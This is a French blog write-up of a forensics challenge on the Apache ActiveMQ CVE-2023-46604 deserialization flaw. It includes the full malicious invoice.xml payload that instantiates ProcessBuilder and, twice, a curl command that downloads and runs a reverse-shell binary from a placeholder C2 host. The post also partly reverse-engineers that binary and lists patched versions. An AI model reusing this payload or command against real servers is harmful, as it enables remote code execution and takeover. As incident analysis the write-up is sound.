---
title: "Apache ActiveMQ sous la Loupe : analyse d'une CVE"
date: 2024-01-22T22:08:20+02:00
draft: false
---

## En résumé

Le challenge consiste à enquêter sur un serveur public signalé par un analyste SOC de niveau 1. Ce serveur émet des connexions sortantes vers plusieurs adresses IP suspectes. L'objectif est d'analyser le dump réseau afin de comprendre ce qu'il s'est passé et la façon dont l'attaquant s'est introduit sur le serveur.

L'attaquant a exploité la [CVE-2023-46604](https://nvd.nist.gov/vuln/detail/CVE-2023-46604) notée 9.8 et publiée fin novembre 2023. Cette faille permet de manipuler la sérialisation des classes Java utilisées dans le protocole de communication [OpenWire](https://en.wikipedia.org/wiki/OpenWire_(binary_protocol)). Cela permet à l'attaquant d'instancier n'importe quelle classe pour exécuter du code distant. Le pirate utilise cette faille pour instancier une class [`ProcessBuilder`](https://docs.oracle.com/javase/8/docs/api/java/lang/ProcessBuilder.html) qui permet de lancer des processus sur le système d'exploitation de la machine. Grâce à cela, l'attaquant contacte son C2, télécharge un reverse shell, lui donne les droits d'exécution et l'exécute :

```bash
curl -s -o /tmp/docker http://<ip C2>/docker; chmod +x /tmp/docker; ./tmp/docker
```

L'attaquant dispose d'un exécutable sur le serveur web qui établi une connection avec lui. Cette vulnérabilité a été utilisée, notamment, pour déployer des cryptominers ou des rootkits. Les impacts sont variés mais dans le cadre d'un cryptominer les performances du système sont impactées, de même que la qualité de service ainsi qu'une usure du matériel prématurée. **Des patchs ont été déployés et les utilisateurs sont invités à mettre à jour leurs systèmes vers les versions 5.15.16, 5.16.7, 5.17.6 ou 5.18.3.** Plus d'information ici : [CVE-2023-46604 (Apache ActiveMQ) Exploited to Infect Systems With Cryptominers and Rootkits](https://www.trendmicro.com/en_us/research/23/k/cve-2023-46604-exploited-by-kinsing.html#:~:text=CVE%2D2023%2D46604%20\(Apache,Systems%20With%20Cryptominers%20and%20Rootkits).

Les investigations nous font remonter jusqu'au programme, que je tente de reverse. Les indices trouvés appuient l'hypothèse d'un reverse shell. On peut résumer les différentes étapes de l'attaque comme suit :

![L'attaquant envoie invoice.xml qui va exploiter la vulnérabilité de OpenWire. L'exploit télécharge le binaire docker qui permet à l'attaquant de prendre le contrôle de la machine.](/img/blog/activemq-cve/infection.png)

<figcaption>L'attaquant envoie invoice.xml qui va exploiter la vulnérabilité de OpenWire. L'exploit télécharge le binaire docker qui permet à l'attaquant de prendre le contrôle de la machine.</figcaption>

## Investigation

Ma méthode, lorsqu'il s'agit de dump réseau, est de commencer par une vue globale. Pour cela, j'utilise Network Miner : 

![Une vue d'ensemble des appareils présents sur le réseau.](/img/blog/activemq-cve/networkminer.png)

<figcaption>Une vue d'ensemble des appareils présents sur le réseau.</figcaption>

A première vue, rien ne semble particulièrement louche. Dans l'onglet `Files`, on observe deux fichiers `invoice.xml` : 

```xml
<?xml version="1.0" encoding="UTF-8" ?>
    <beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
        <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
            <constructor-arg >
            <list>
                <!--value>open</value>
                <value>-a</value>
                <value>calculator</value -->
                <value>bash</value>
                <value>-c</value>
                <value>curl -s -o /tmp/docker http://<ip-C2>/docker; chmod +x /tmp/docker; ./tmp/docker</value>
            </list>
            </constructor-arg>
        </bean>
    </beans>
```

La commande `curl` est manifestement malveillante : elle télécharge un exécutable `docker` depuis un serveur C2, le rend exécutable et l'exécute.

On trouve les traces de ces actions sur Wireshark. Dans ce cas, il n'y a pas beaucoup de traffic et peu d'IPs, cela nous facilite la tâche. On identifie l'adresse IP malveillante. Nous avons donc 2 IPs : 
- celle utilisée par l'attaquant pour envoyer l'exploit
- celle que l'exploit contacte (C2) pour télécharger le reverse shell

![Liste des paquets HTML échangés.](/img/blog/activemq-cve/wireshark.png)

<figcaption>Liste des paquets HTML échangés.</figcaption>

On voit bien ici le trafic réseau de l'attaquant qui envoie la vulnérabilité, cette dernière contacte le C2 et télécharge la charge finale.

## Quels sont les capacités de docker ?

On parle bien entendu du binaire Linux récupéré et non de l'outil de conteneurisation. Puisque ce fichier a été échangé via le réseau, on est en capacité de le récupérer.

Mes compétences en reverse sont limités. Cependant, le fichier étant très petit (250 octets), j'ai décidé de tenter le coup. On observe plusieurs `syscall` Linux : 

- `sys_mmap`
Il sert à créer un mappage entre une région de mémoire virtuelle d'un processus et une ressource physique ou un fichier. Utile pour mapper un fichier en mémoire, allouer de la mémoire ou créer une zone de mémoire partagée.

- `sys_socket`
Il permet de créer un point de communication, ou socket, pour communiquer avec un autre processus sur une machine distante.

- `sys_connect`
Utilisé avec le précédent, il permet d'établir une connection réseau.

- `sys_nanosleep`
Suspend l'exécution du programme.

- `sys_exit`
Termine l'exécution du programme.

La combinaison du syscall de création de socket et de connexion semble bien indiquer un reverse shell. De toute façon, avec 250 octets, le programme ne peut pas avoir de fonctionnalité très avancée. Cependant, il est curieux de constater qu'il n'y a pas d'appel système pour **recevoir** (recv) et exécuter la commande reçue.

Il y a également la présence d'une valeur codée en dur : `5C15BE92BB010002`.

- Hypothèse 1 : cette valeur est une clef de chiffrement/déchiffrement pour obfusquer des paramètres du programmes et chiffrer les communications avec le C2.

On peut écarter cette hypothèse car il n'y a pas d'autres chaînes de caractères et il ne semble pas y avoir de fonction de déchiffrement/décodage dans le programme.

- Hypothèse 2 : cette valeur contient les informations de connexions avec le C2 (IP + port + autre chose ?).

Cet "autre chose" pourrait être un identifiant de compromission. Utilisé parfois par les attaquants, un identifiant sert à identifier la victime afin de mieux les monitorer : gardons à l'esprit la volonté d'industrialisation dans ce type d'attaque. Cette hypothèse est plus plausible car ce paramètre est proche de l'appel à `sys_connect`.

![La mystérieuse chaîne de caractère ainsi que l'appel à sys_connect.<](/img/blog/activemq-cve/reverse.png)

<figcaption>La mystérieuse chaîne de caractère ainsi que l'appel à sys_connect.</figcaption>
